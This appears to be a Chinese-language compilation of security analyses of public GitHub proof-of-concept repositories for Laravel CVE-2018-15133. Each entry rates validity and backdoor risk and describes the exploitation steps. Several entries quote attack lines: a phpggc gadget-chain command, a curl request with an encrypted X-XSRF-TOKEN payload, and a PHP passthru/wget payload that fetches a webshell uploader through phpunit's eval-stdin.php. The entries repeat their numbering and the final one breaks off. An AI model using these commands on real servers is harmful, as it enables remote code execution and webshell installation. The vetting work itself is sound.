提供的漏洞利用代码 `rce.sh` 通过访问 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php` 接口，利用该接口执行PHP代码的特性，尝试上传一个PHP Webshell（uploader.php）。虽然脚本本身的功能是上传webshell，但脚本并不会主动植入恶意后门,所以判定投毒风险为0%。 脚本的原理是利用 phpunit 的 eval-stdin.php 文件, 该文件可以执行POST请求中的PHP代码, 从而进行webshell上传。 这种利用方式依赖于目标环境存在phpunit且eval-stdin.php文件存在且可访问。

**项目地址:** [Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader](https://github.com/Prabesh01/Laravel-PHP-Unit-RCE-Auto-shell-uploader)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #9

**来源**: [CVE-2018-15133-aljavier_exploit_laravel_cve-2018-15133.md](../2018/CVE-2018-15133-aljavier_exploit_laravel_cve-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 and 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY，这通常需要事先获得了特权访问权限或成功实施了先前的攻击。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133是Laravel框架中的一个反序列化漏洞。攻击者可以利用此漏洞，通过在X-XSRF-TOKEN中注入恶意序列化数据，实现在目标服务器上执行任意代码。漏洞利用的核心在于`Illuminate/Encryption/Encrypter.php`中的`decrypt`方法和`phpggc`中的`gadgetchains/Laravel/RCE/3/chain.php`。

**有效性：**

从漏洞描述和搜索结果来看，此漏洞已经被CISA列入已知被利用的漏洞目录，表明该漏洞在野外被积极利用。提供的PoC代码基于已知的利用方式，并参考了 Metasploit 的 exploit，所以该PoC代码有效。

**投毒风险：**

PoC代码主要由两个文件组成：`README.md` 和 `pwn_laravel.py`。

*   `README.md`: 包含漏洞描述、利用方法、依赖安装和免责声明等信息。没有发现恶意代码。
*   `pwn_laravel.py`: PoC利用脚本，用于生成恶意payload并发送到目标服务器。脚本利用了`Crypto`库进行加密和解密操作。虽然代码功能是实现RCE，但本身逻辑并没有发现明显的投毒行为。

分析后认为，投毒风险主要存在于依赖项上，尤其是`Crypto`库。但是由于该库比较常用，如果存在恶意代码，可能会被更早发现。

根据代码的功能和依赖关系，判定投毒风险为10%。

**利用方式：**

1.  **获取APP_KEY：** 这是利用此漏洞的关键前提。攻击者需要获取目标Laravel应用的APP_KEY。APP_KEY通常存储在`.env`文件中。
2.  **生成恶意Payload：** 使用PoC脚本`pwn_laravel.py`，指定目标URL、APP_KEY和要执行的命令，生成恶意的序列化数据，并使用APP_KEY对其进行加密。
3.  **发送请求：** 将生成的加密数据作为`X-XSRF-TOKEN`的值，通过HTTP请求发送到目标Laravel应用。
4.  **触发反序列化：** Laravel应用在处理请求时，会尝试解密`X-XSRF-TOKEN`，并对其进行反序列化。如果APP_KEY正确，且反序列化链存在，则会导致远程代码执行。

总而言之，该漏洞的利用依赖于APP_KEY的泄露，攻击难度较高，但危害性很大。

**项目地址:** [aljavier/exploit_laravel_cve-2018-15133](https://github.com/aljavier/exploit_laravel_cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #10

**来源**: [CVE-2018-15133-bukitbarisan_laravel-rce-cve-2018-15133.md](../2018/CVE-2018-15133-bukitbarisan_laravel-rce-cve-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化漏洞

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道 APP_KEY，通常不易获取，除非之前已获得权限或成功进行过其他攻击。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 直到 5.5.40 和 5.6.x 直到 5.6.29 版本中。由于对 X-XSRF-TOKEN 值进行不可信的反序列化调用，可能导致远程代码执行。涉及到 Illuminate/Encryption/Encrypter.php 中的 decrypt 方法和 phpggc 中 gadgetchains/Laravel/RCE/3/chain.php 。攻击者必须知道应用程序密钥（APP_KEY），这通常不会发生，但如果攻击者之前拥有特权访问权限或成功完成了之前的攻击，则可能会发生。

**利用方式：**

1.  **获取 APP_KEY：** 这是利用此漏洞的关键前提。攻击者需要设法获取 Laravel 应用的 APP_KEY，这可能通过源代码泄露、数据库访问或其他漏洞实现。
2.  **构造恶意 XSRF-TOKEN：** 使用 phpggc 工具生成包含恶意 PHP 对象的序列化字符串。该对象旨在利用 Laravel 框架中的反序列化漏洞执行任意代码。
3.  **加密 Payload：**  使用 APP_KEY 对序列化的 Payload 进行加密，生成有效的 XSRF-TOKEN。代码中的`cve.php`脚本完成了这个步骤，使用APP_KEY对phpggc生成的Payload加密，然后放入Cookie中。
4.  **发送包含恶意 XSRF-TOKEN 的请求：**  将构造的 XSRF-TOKEN 设置为 Cookie，并发送到目标 Laravel 应用。
5.  **触发反序列化：**  当 Laravel 应用尝试解密并反序列化 XSRF-TOKEN 时，恶意对象将被实例化，从而执行攻击者指定的代码。

**POC有效性：**

根据提供的漏洞信息、搜索结果以及漏洞利用代码，此POC有效。存在多个公开的漏洞利用代码，CISA也将此漏洞标记为已知被利用漏洞，增加了POC的有效性。

**投毒风险：**

虽然主利用脚本 `cve.php` 看起来是直接利用漏洞，但仍然存在一些潜在的投毒风险：

*   **依赖外部资源：** `cve.php` 依赖于 `phpggc` 工具，如果 `phpggc` 被篡改，可能会引入恶意代码。风险相对较低，因为 `phpggc` 是一个广泛使用的工具，被篡改的可能性较低。但是仍需确认。
*   **shell_exec函数滥用风险：** `cve.php` 中多次使用了 `shell_exec` 函数，包括执行 `phpggc` 命令和 `curl` 命令。如果攻击者可以控制这些命令的参数，就可能执行任意系统命令。由于 `cve.php` 需要用户提供 APP_KEY 和目标 URL，并且有 payload 参数，存在用户误用的情况，比如直接使用了恶意payload。
*   **README.md文件：**此文件是正常的说明文档，没有发现投毒内容。
*   **phpggc:** 本身作为一个payload生成器，其本身不应该作为投毒风险考虑，而是应该考虑其生成payload的安全性。

考虑到以上因素，评估此仓库的投毒风险为 10%。 风险主要集中在用户误用，或者`phpggc`工具被篡改的可能性。

**项目地址:** [bukitbarisan/laravel-rce-cve-2018-15133](https://github.com/bukitbarisan/laravel-rce-cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #11

**来源**: [CVE-2018-15133-kozmic_laravel-poc-CVE-2018-15133.md](../2018/CVE-2018-15133-kozmic_laravel-poc-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework Token Unserialize RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 远程代码执行 (RCE)

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道 APP_KEY，通常需要之前已经获得的特权访问或成功利用了之前的漏洞。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-15133 漏洞是 Laravel Framework 中由于对 X-XSRF-TOKEN 值进行不安全的反序列化操作导致的远程代码执行漏洞。攻击者可以通过伪造恶意的 X-XSRF-TOKEN，并将其加密后发送给服务器，服务器在解密并反序列化该 token 时，会执行攻击者预先设定的恶意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果以及提供的漏洞利用代码，此漏洞的 POC 代码是有效的。搜索引擎结果中包含了多个指向该漏洞的详细描述、利用代码示例以及缓解措施的文章，包括 CISA 将其添加到已知被利用的漏洞目录中。
提供的 Dockerfile 文件和 README.md 文件描述了如何搭建一个存在漏洞的 Laravel 环境并利用 `cve-2018-15133.php` 脚本进行攻击。README.md 中给出了详细的利用步骤，包括获取 APP_KEY，生成反序列化 Payload，加密 Payload，最后通过 POST 请求发送 Payload。脚本通过构造特定的 PHP 对象，在反序列化时触发 `system()` 函数来执行任意命令。

**投毒风险：**
Dockerfile文件用于构建一个包含漏洞版本的Laravel应用的Docker镜像。 cve-2018-15133.php 用于漏洞利用，并没有发现可疑或恶意行为，因此投毒风险较低。

代码仓库中主要为演示漏洞利用的代码，并无发现存在恶意行为或后门的代码。`phpggc` 用于生成payload，但其本身不是由该作者提供的,所以此处不做分析。Dockerfile 安装的是已知漏洞版本的 Laravel，用于复现，而不是植入后门，所以投毒可能性较低。 投毒风险较低，大约在1%以下。

**利用方式：**
1.  **获取 APP_KEY：** 攻击者需要首先获取 Laravel 应用的 APP_KEY。通常，这需要攻击者已经获得了服务器的某些权限，例如读取 `.env` 文件的权限。可以通过`docker exec -it $(docker ps --latest --quiet) grep -e ^APP_KEY /var/www/html/laravel/.env`来获取，这说明需要一定的权限才能获取该KEY，这使得利用难度增大。
2.  **生成反序列化 Payload：** 攻击者使用 `phpggc` 工具（或类似工具）生成一个恶意 PHP 反序列化 Payload。该 Payload 包含一个精心构造的对象链，当被反序列化时，会执行任意命令。 例如，`phpggc Laravel/RCE1 'uname -a' -b`。
3.  **加密 Payload：** 使用 Laravel 的加密机制（`Illuminate\Encryption\Encrypter`）以及 APP_KEY 对 Payload 进行加密，生成一个类似于 Laravel XSRF-TOKEN 的字符串。这通过 cve-2018-15133.php 进行
4.  **发送 Payload：** 将加密后的 Payload 放在 `X-XSRF-TOKEN` HTTP header 中，发送一个 POST 请求到存在漏洞的 Laravel 应用。 例如：`curl localhost:8000 -X POST -H 'X-XSRF-TOKEN: eyJpdiI6Imp3c1BUejE5aGFFUVM4a0NcLzIyODBnPT0iLCJ2YWx1ZSI6InZrTEdOY2o1NlVJdlltWFl3OFBxTEY1a1pCZWlaSDRSdXM1STNSa21sSE5Cb3hFd09cL2JUdU0wWHhjK0dUU0dYQzlTd3ZYSm50NTc4NW90UnNrZW5mMHc2RHdcLzZia01cL29wVUhjQml5cCtmZ1VcL2lwbnVySG52MHEwWXdZMVFVSXhWYjFEQlwveTZPQ3JORnRYdVQyeVFnODM1UGVCSVFcL3B6RGs2VDczOTZEbkFKdFwvc3lpZXBtcUo4VllLNU4zS0pMV3ZBUlNXZDRHRmNnOG1vOFZUWDVicE5uV0FcL1NSXC9HRjh2XC9YR2pLUDlEdlEwaytWRHl5TFhvb3RXM0Y4ejNXIiwibWFjIjoiOTMwMTNkZDYwYzNjYmQ1YTg4ZjRmNjM2NmZhMzBjNzA5NTgzYmI`
5.  **触发 RCE：** Laravel 应用在处理请求时，会解密并反序列化 `X-XSRF-TOKEN` 的值。由于 Payload 是恶意的，反序列化过程会触发远程代码执行，导致服务器执行攻击者预先设定的命令。


**项目地址:** [kozmic/laravel-poc-CVE-2018-15133](https://github.com/kozmic/laravel-poc-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #12

**来源**: [CVE-2018-15133-pwnedshell_Larascript.md](../2018/CVE-2018-15133-pwnedshell_Larascript.md)

# CVE-2018-15133

> 📦 该CVE有 **13** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2018-15133-0xSalle_cve-2018-15133.md](../2018/CVE-2018-15133-0xSalle_cve-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行和服务器被完全控制

**影响版本:** 5.5.40 及之前版本，5.6.x 版本直至 5.6.29

**利用条件:** 需要知道 Laravel 应用的 APP_KEY，通常情况下无法获取，但如果攻击者之前拥有过特权访问权限或成功完成了之前的攻击，则可能获取到。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 中，攻击者可以通过在 X-XSRF-TOKEN 值上进行未授权的反序列化操作，导致远程代码执行。漏洞存在于 Illuminate/Encryption/Encrypter.php 的 decrypt 方法和 phpggc 的 gadgetchains/Laravel/RCE/3/chain.php 中。利用该漏洞需要知道 Laravel 应用的 APP_KEY，并通过精心构造的序列化数据，触发特定的 PHP 对象链（gadget chain）执行任意代码。

**有效性：**
提供的 POC 代码看起来是有效的，因为它实现了以下功能：
1.  生成恶意 payload：根据指定的命令、API 密钥和 payload 方法，生成反序列化 payload。
2.  加密 payload：使用 Laravel 应用的 APP_KEY 对 payload 进行 AES 加密，并生成相应的 IV 和 MAC 值。
3.  发送 payload：将加密后的 payload 设置到 X-XSRF-TOKEN cookie 中，并发送请求到 Laravel 应用。

**投毒风险：**
该代码仓库中存在一定的投毒风险，大约为10%。风险主要体现在以下几个方面：
1.  **潜在的后门代码：** 即使表面上代码实现了漏洞利用的功能，但攻击者可能在代码中隐藏一些恶意的后门，例如：
    *   在生成 payload 的过程中，插入额外的恶意代码。
    *   在请求发送过程中，记录或泄露敏感信息。
    *   利用漏洞在目标服务器上部署持久化后门。
2.  **依赖风险：** 该 POC 代码可能依赖于一些外部库或模块，这些库或模块本身可能存在安全漏洞或恶意代码。
3.  **不完善的错误处理：** 代码中的错误处理可能不够完善，导致程序在特定情况下崩溃或产生其他安全问题。

**利用方式：**
利用方式如下：
1.  **获取 APP_KEY：** 首先需要获取 Laravel 应用的 APP_KEY。这通常是最困难的一步，可能需要通过其他漏洞或社会工程学手段获取。
2.  **生成 Payload：** 使用 POC 代码生成包含恶意命令的 payload。POC 允许选择不同的 payload 方法（Laravel RCE1, RCE2, RCE3, RCE4），选择合适的 payload 方法可能取决于目标环境的配置。
3.  **加密 Payload：** 使用 APP_KEY 对生成的 payload 进行加密，并计算 MAC 值。
4.  **发送请求：** 将加密后的 payload 作为 X-XSRF-TOKEN cookie 的值发送到目标 Laravel 应用。
5.  **触发反序列化：** Laravel 应用在处理请求时，会尝试解密并反序列化 X-XSRF-TOKEN 的值，从而触发漏洞，执行恶意代码。

**项目地址:** [0xSalle/cve-2018-15133](https://github.com/0xSalle/cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #2

**来源**: [CVE-2018-15133-AlienX2001_better-poc-for-CVE-2018-15133.md](../2018/CVE-2018-15133-AlienX2001_better-poc-for-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行，完全控制服务器

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，可以通过其他漏洞获取或之前已获得特权访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 5.5.40 及之前版本，以及 5.6.x 系列的 5.6.29 及之前版本中。攻击者可以通过在 X-XSRF-TOKEN 中发送恶意序列化数据，利用 `unserialize` 函数执行任意代码。利用链涉及 `Illuminate/Encryption/Encrypter.php` 的 decrypt 方法以及 phpggc 中的 `PendingBroadcast` gadget chain。攻击的先决条件是攻击者需要知道 Laravel 应用的 `APP_KEY`，这通常很难，但可以通过信息泄露漏洞或其他攻击获得。提供的 PoC 代码包含一个 bash 脚本 `betterpoc.sh` 用于自动化利用，以及一个 PHP 脚本 `cve-2018-15133.php` 用于生成恶意 X-XSRF-TOKEN。`betterpoc.sh` 脚本通过调用 `phpggc` 生成反序列化 payload，然后使用 `cve-2018-15133.php` 脚本利用 APP_KEY 加密 payload，最终通过 curl 发送包含恶意 token 的 POST 请求。投毒风险分析：尽管 PoC 代码主要用于漏洞验证，自动化脚本存在轻微风险，例如通过修改命令注入后门，该风险较低，约10%，因需要使用者进行配置，且代码清晰可见。利用方式总结：1. 获取目标 Laravel 应用的 APP_KEY。2. 使用 phpggc 生成执行任意命令的反序列化 payload。3. 使用 cve-2018-15133.php 脚本，利用 APP_KEY 加密 payload 生成 X-XSRF-TOKEN。4. 发送包含恶意 X-XSRF-TOKEN 的 POST 请求到目标服务器。

**项目地址:** [AlienX2001/better-poc-for-CVE-2018-15133](https://github.com/AlienX2001/better-poc-for-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #3

**来源**: [CVE-2018-15133-AzhariKun_CVE-2018-15133.md](../2018/CVE-2018-15133-AzhariKun_CVE-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化RCE

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，并且目标存在未升级的Laravel框架漏洞版本。

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2018-15133是Laravel框架中的一个反序列化漏洞，攻击者通过在X-XSRF-TOKEN中注入恶意序列化数据，并利用`Illuminate/Encryption/Encrypter.php`中的`decrypt`方法进行解密时触发反序列化操作，从而执行任意代码。

**有效性：**
根据漏洞描述和搜索结果，提供的POC代码利用了该漏洞，通过上传包含恶意payload的XSRF-TOKEN，理论上是有效的。该代码首先尝试从`.env`文件中获取`APP_KEY`，然后将目标站点和`APP_KEY`发送到 `http://exploit.anons79.com/`，进行后续处理。GitHub上也有公开的利用代码，可以辅助验证漏洞。

**投毒风险：**
POC 代码存在一定的投毒风险。

1.  **依赖外部网站**：POC 代码向 `http://exploit.anons79.com/` 发送数据。如果这个网站被攻陷或者被作者控制，可能被植入恶意代码。所以具有一定的风险。
2.  **未知的恶意行为**：`http://exploit.anons79.com/` 站点的行为是不透明的。虽然POC声称是自动上传shell,但实际实现可能包含未知的恶意行为，例如：收集目标信息，植入更深层次的后门。
3.  **`.env` 文件泄露**:  直接尝试从 `.env` 文件中读取 `APP_KEY` 存在风险，可能导致敏感信息泄露。

综合来看，投毒风险大概在20%左右。

**利用方式：**
1.  **获取APP_KEY：** 攻击者首先需要获取Laravel应用的APP_KEY。这可以通过多种方式实现，例如：
    *   直接读取.env文件（如果配置不当允许访问）。
    *   通过其他漏洞（如文件包含、SQL注入等）获取。
    *   猜测或者暴力破解（难度较高）。
2.  **构造恶意payload：** 攻击者使用phpggc等工具，根据已知的gadget chain构造恶意的序列化payload。
3.  **加密payload：** 使用APP_KEY和Laravel的加密算法对payload进行加密。
4.  **发送请求：** 将加密后的payload作为X-XSRF-TOKEN的值，发送到目标Laravel应用。
5.  **触发反序列化：** 当Laravel应用处理请求时，会解密X-XSRF-TOKEN，从而触发反序列化操作，最终执行payload中的恶意代码，实现远程代码执行。

**项目地址:** [AzhariKun/CVE-2018-15133](https://github.com/AzhariKun/CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #4

**来源**: [CVE-2018-15133-Bilelxdz_Laravel-CVE-2018-15133.md](../2018/CVE-2018-15133-Bilelxdz_Laravel-CVE-2018-15133.md)

## CVE-2018-15133 Laravel Framework 反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞导致远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道应用程序密钥（APP_KEY），并且目标系统存在脆弱的Laravel版本。需要网络访问。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 漏洞存在于 Laravel Framework 框架中，由于对 X-XSRF-TOKEN 值的反序列化操作不当导致远程代码执行。具体来说，`Illuminate/Encryption/Encrypter.php` 中的 `decrypt` 方法和 `phpggc` 中的 `gadgetchains/Laravel/RCE/3/chain.php` 存在问题。攻击者需要知道应用程序的 APP_KEY 才能利用此漏洞，通常情况下这是不可能的，除非攻击者之前已经获得了特权访问权限或成功完成了之前的攻击。

**有效性评估：**
根据漏洞信息、搜索结果和漏洞利用代码，该漏洞的PoC代码**可能有效**。github上的确存在相关的exp仓库（例如：aljavier/exploit_laravel_cve-2018-15133 和 kozmic/laravel-poc-CVE-2018-15133）。漏洞利用需要已知APP_KEY。

**投毒风险分析：**
提供的PoC代码 `cve.py` 的主要功能是生成包含恶意 URL 的 `curl` 命令，并将其写入 `nikmok.txt` 文件。该 URL 包含一个路径 `/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php`，并在GET请求中包含一段PHP代码，尝试使用`passthru`函数执行`wget`命令，从github下载 `vspup.php` 并保存为 `lol.php`。这种行为本身就具有风险，因为攻击者可能会控制下载的 `lol.php` 内容，从而执行任意代码。

`README.md` 文件指示用户执行 `nikmok.txt` 文件，该文件包含之前生成的 `curl` 命令，实际上是执行远程文件下载和执行的命令。`/vendor/phpunit/phpunit/src/Util/PHP/lol.php` 文件的路径则指示尝试访问利用`vspup.php`下载的lol.php文件，但是这个路径并不合理，因为vspup.php已经被下载到根目录并命名为lol.php。因此，该EXP存在一些问题，**投毒风险较低,大约为10%**，主要集中在github仓库作者可能在其他文件中包含恶意代码或在vspup.php中植入后门（虽然这个不是这个仓库作者控制的）。

**利用方式：**

1.  **前提条件：** 获取目标 Laravel 应用的 APP_KEY。
2.  **构造恶意 X-XSRF-TOKEN：** 使用 `phpggc` 工具生成包含恶意 payload 的序列化数据。该 payload 利用 Laravel 的反序列化漏洞，可以执行任意代码。
3.  **加密 X-XSRF-TOKEN：** 使用 APP_KEY 对 payload 进行加密，生成有效的 X-XSRF-TOKEN。
4.  **发送请求：** 将加密后的 X-XSRF-TOKEN 作为 Cookie 或 Header 发送到目标 Laravel 应用。
5.  **触发漏洞：** 当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN 时，恶意 payload 将被执行，从而实现远程代码执行。
6.  **简化流程(根据提供的POC代码)：**
    a. 运行`cve.py`脚本，输入目标网址。
    b. 脚本会将包含特定路径和参数的curl命令写入`nikmok.txt`，尝试通过GET请求和数据`<?php echo passthru("wget https://raw.githubusercontent.com/sKirua/Vespa-Uploader/master/vspup.php -O lol.php");?>`来下载文件。
    c. 运行`nikmok.txt`（实际上是运行文件内包含的curl命令）。
    d. 目标网站如果存在对应路径，则会尝试下载并执行githubusercontent中的`vspup.php`文件，该文件会被重命名为`lol.php`。
    e.  最终的利用需要攻击者能访问到通过`vspup.php`下载的lol.php文件，在提供的路径`/vendor/phpunit/phpunit/src/Util/PHP/lol.php`中，尝试执行恶意代码。

**项目地址:** [Bilelxdz/Laravel-CVE-2018-15133](https://github.com/Bilelxdz/Laravel-CVE-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #5

**来源**: [CVE-2018-15133-Cr4zyD14m0nd137_Lab-for-cve-2018-15133.md](../2018/CVE-2018-15133-Cr4zyD14m0nd137_Lab-for-cve-2018-15133.md)

## CVE-2018-15133-Laravel-反序列化RCE

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40 和 5.6.x <= 5.6.29

**利用条件:** 需要知道应用的APP_KEY

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-15133 存在于 Laravel Framework 直到 5.5.40 和 5.6.x 直到 5.6.29 版本中，是由于对 X-XSRF-TOKEN 值进行 unserialize 调用时，可能导致远程代码执行。漏洞存在于 Illuminate/Encryption/Encrypter.php 的 decrypt 方法和 phpggc 中的 gadgetchains/Laravel/RCE/3/chain.php 中。攻击者必须知道应用程序密钥（APP_KEY），通常这是不可能发生的，除非攻击者先前拥有特权访问权限或成功完成了之前的攻击。

**漏洞利用方式：**

1.  攻击者需要获取 Laravel 应用的 APP_KEY。这通常是最困难的一步。
2.  攻击者使用 phpggc (或类似工具) 生成一个恶意的 PHP 对象序列化字符串，该字符串利用了 Laravel 框架中的反序列化漏洞链（例如，PendingBroadcast 和相关的 gadget chain）。
3.  该序列化字符串被加密并编码，然后设置为 X-XSRF-TOKEN cookie 的值。
4.  当 Laravel 应用尝试解密和反序列化 X-XSRF-TOKEN cookie 时，恶意的对象链会被触发，导致远程代码执行。

**POC有效性：**

提供的 POC 代码利用了 CVE-2018-15133 漏洞。代码中包含了生成加密数据，设置 X-XSRF-TOKEN cookie，以及发送请求的代码。给定的命令可以通过反序列化执行。

**投毒风险：**

查看`exploit.go`后，发现代码的主要功能是生成恶意序列化数据，加密数据，以及发送HTTP请求。该`exploit.go`文件代码量较少,功能明确,没有发现明显的恶意代码。
README.md 文档描述了漏洞利用的步骤和所需的环境。其中提到需要下载并运行 Docker 镜像 `kozmico/laravel-poc-cve-2018-15133`。 虽然该 Docker 镜像本身不是本次评估的一部分，但是如果该镜像中包含恶意代码，则可能会导致投毒攻击。该镜像的安全性需要单独评估。此外，该README建议使用 kali linux 虚拟机进行攻击。说明攻击环境搭建比较复杂。总的来说，此仓库存在一定的投毒风险，但主要风险来源于引用的 Docker 镜像，而非提供的Go代码。根据评估，代码本身存在投毒的概率较低，大约在10%。

**项目地址:** [Cr4zyD14m0nd137/Lab-for-cve-2018-15133](https://github.com/Cr4zyD14m0nd137/Lab-for-cve-2018-15133)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #6

**来源**: [CVE-2018-15133-Loaxert_CVE-2018-15133-PoC.md](../2018/CVE-2018-15133-Loaxert_CVE-2018-15133-PoC.md)

## CVE-2018-15133-Laravel框架-反序列化远程代码执行

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化远程代码执行

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道APP_KEY，通过X-XSRF-TOKEN传递恶意payload。

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-15133漏洞存在于Laravel Framework的5.5.40及之前版本，以及5.6.x到5.6.29版本。该漏洞是由于对X-XSRF-TOKEN值进行unserialize调用时，未对数据进行充分验证，导致远程代码执行。攻击者需要知道APP_KEY才能成功利用此漏洞。这个APP_KEY通常不会被泄露，但如果攻击者之前拥有特权访问权限或成功完成了之前的攻击，则可能发生。

**漏洞利用方式：**

1.  攻击者获取Laravel应用的APP_KEY（例如，通过源代码泄露、环境变量泄露等）。
2.  攻击者使用phpggc生成包含恶意代码的PHP序列化payload。POC中使用了`Laravel/RCE5` gadget chain，该gadget chain允许执行任意系统命令。
3.  攻击者使用APP_KEY加密该payload，并将其设置为X-XSRF-TOKEN cookie的值。
4.  攻击者向目标Laravel应用发送包含该cookie的HTTP请求。
5.  Laravel应用解密cookie值，然后反序列化payload，执行恶意代码。

**漏洞利用有效性：**

提供的PoC代码是有效的，因为它实现了上述漏洞利用过程。该脚本使用phpggc生成payload，然后使用APP_KEY对其进行加密，并发送包含该加密payload的HTTP请求。

**投毒风险：**

该代码的投毒风险极低。原因如下：

*   代码量较少，逻辑清晰，主要功能是利用已知的反序列化漏洞。
*   代码使用了subprocess调用外部程序phpggc，如果phpggc本身被篡改，则可能引入风险，但该风险不在本代码的范围内。
*   代码中没有发现任何尝试连接外部服务器或执行其他恶意操作的迹象。
*  由于脚本依赖phpggc来生成payload, 因此如果phpggc被替换成了恶意版本,可能会存在被投毒的风险. 但本脚本本身只是对phpggc的调用,不具备投毒的特性. 如果不考虑第三方依赖的风险, 代码投毒风险评估为1%.

**项目地址:** [Loaxert/CVE-2018-15133-PoC](https://github.com/Loaxert/CVE-2018-15133-PoC)

**漏洞详情:** [CVE-2018-15133](https://nvd.nist.gov/vuln/detail/CVE-2018-15133)

---

## POC #7

**来源**: [CVE-2018-15133-NatteeSetobol_CVE-2018-15133-Lavel-Expliot.md](../2018/CVE-2018-15133-NatteeSetobol_CVE-2018-15133-Lavel-Expliot.md)

## CVE-2018-15133-Laravel-反序列化漏洞

**漏洞编号:** CVE-2018-15133

**漏洞类型:** 反序列化漏洞

**影响应用:** Laravel Framework

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** <= 5.5.40, 5.6.x <= 5.6.29

**利用条件:** 需要知道 Laravel 应用的 application key

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-15133 是 Laravel 框架中的一个反序列化漏洞，存在于 5.5.40 及之前的版本，以及 5.6.x 系列的 5.6.29 及之前的版本。该漏洞源于对 X-XSRF-TOKEN 值的不可信反序列化调用，攻击者可以通过构造恶意的序列化数据，并将其作为 X-XSRF-TOKEN 的值发送到服务器，从而触发远程代码执行。

**漏洞利用方式：**

1.  攻击者需要获取 Laravel 应用的 application key。这通常是利用此漏洞最困难的部分。攻击者可能通过先前获取的权限或信息泄露来获得此密钥。
2.  攻击者使用 phpggc 等工具，基于 PendingBroadcast gadget chain 生成恶意的序列化 payload。
3.  攻击者使用 application key 对 payload 进行加密，并生成相应的 X-XSRF-TOKEN 值。
4.  攻击者将构造的 X-XSRF-TOKEN 值添加到 HTTP 请求头中，并发送到目标 Laravel 应用。
5.  服务器在处理请求时，会尝试解密并反序列化 X-XSRF-TOKEN 值，从而触发 payload 中的恶意代码，最终实现远程代码执行。

**有效性：**

根据漏洞信息、搜索结果和提供的 POC 代码，可以判断该漏洞利用是有效的。搜索结果中提供了多个关于此漏洞的描述和利用的链接，包括 NVD、CISA 的已知被利用漏洞目录以及 GitHub 上的 POC 代码仓库。

提供的 POC 代码 (main.cpp) 看起来是一个 C++ 编写的漏洞利用程序，它实现了以下功能：

*   接受 URL、命令和 application key 作为参数。
*   生成恶意的 X-XSRF-TOKEN 值。
